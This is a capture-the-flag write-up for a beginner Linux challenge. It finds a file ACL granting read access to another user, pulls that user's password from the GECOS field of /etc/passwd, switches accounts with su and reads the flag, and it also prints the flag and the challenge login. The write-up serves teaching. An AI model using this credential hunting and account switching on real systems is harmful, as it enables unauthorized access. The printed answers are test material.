# Trapped

## Challenge Info
- **Category**: beginner
- **Points**: 50
- **Remote**: `ssh trapped@chall.0xfun.org -p62879`
- **Credentials**: `trapped:password`
- **Description**: "Strict restrictions to earn the flag."
- **Flag**: `0xfun{4ccess_unc0ntroll3d}`

## Analysis

### Initial Access
```bash
ssh trapped@chall.0xfun.org -p62879
# Password: password
```

### Reconnaissance
```bash
$ ls -la
total 36
dr-xr-xr-x  1 trapped trapped 4096 Nov 17 05:28 .
dr-xr-xr-x  1 root    root    4096 Nov 17 05:28 ..
-r--r--r--  1 trapped trapped  220 Feb 25  2020 .bash_logout
-r--r--r--  1 trapped trapped 3771 Feb 25  2020 .bashrc
-r--r--r--  1 trapped trapped  807 Feb 25  2020 .profile
----r-----+ 1 root    root      27 Nov 17 05:28 flag.txt
                      ^
                      ACL indicator
```

**Key observation**: The `flag.txt` file has unusual permissions `----r-----+` with a `+` symbol indicating **Access Control Lists (ACLs)** are in use.

## Vulnerability

### ACL Discovery
```bash
$ getfacl flag.txt
# file: flag.txt
# owner: root
# group: root
user::---
user:secretuser:r--    # <-- secretuser can read!
group::---
mask::r--
other::---
```

**Finding**: The user `secretuser` has read permissions on `flag.txt` via ACLs, even though standard Unix permissions show no access for others.

### Password Discovery in /etc/passwd
```bash
$ cat /etc/passwd | grep secretuser
secretuser:x:1001:1001:Unc0ntr0lled1234Passw0rd:/home/secretuser:/bin/sh
                       ^^^^^^^^^^^^^^^^^^^^^^^
                       GECOS field with password!
```

**Vulnerability**: The GECOS field (comment field) in `/etc/passwd` contains what appears to be the password for `secretuser`: `Unc0ntr0lled1234Passw0rd`

## Exploitation

### Step 1: Switch to secretuser
```bash
$ su secretuser
Password: Unc0ntr0lled1234Passw0rd

$ whoami
secretuser
```

### Step 2: Read the flag
```bash
$ cat /home/trapped/flag.txt
0xfun{4ccess_unc0ntroll3d}
```

## Complete Exploit
```bash
# SSH into trapped account
ssh trapped@chall.0xfun.org -p62879
# Password: password

# Check ACLs on flag
getfacl flag.txt
# Shows: user:secretuser:r--

# Find secretuser's password in /etc/passwd
cat /etc/passwd | grep secretuser
# secretuser:x:1001:1001:Unc0ntr0lled1234Passw0rd:/home/secretuser:/bin/sh

# Switch to secretuser
su secretuser
# Password: Unc0ntr0lled1234Passw0rd

# Read flag
cat /home/trapped/flag.txt
```

## Key Lessons

1. **ACLs extend standard Unix permissions** - The `+` symbol in `ls -la` output indicates ACLs are in use. Always check with `getfacl` when you see this indicator.

2. **GECOS field misuse** - The GECOS field in `/etc/passwd` is meant for user information (full name, phone, etc.) but is sometimes misused to store sensitive data. Always check it during enumeration.

3. **Information disclosure via /etc/passwd** - Even though `/etc/passwd` is world-readable by design (passwords are in `/etc/shadow`), administrators sometimes accidentally leak sensitive information in comments.

4. **ACLs bypass standard permission checks** - A file can appear completely locked down with `000` permissions, but ACLs can still grant specific users access.

## Commands Reference
```bash
# Check ACLs
getfacl <file>

# Set ACLs (for reference)
setfacl -m u:username:r-- <file>    # Grant user read access
setfacl -x u:username <file>        # Remove user ACL

# View all users
cat /etc/passwd

# Switch user
su <username>
```

## References
- [Linux ACLs Tutorial](https://www.redhat.com/sysadmin/linux-access-control-lists)
- [GECOS field format](https://en.wikipedia.org/wiki/Gecos_field)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
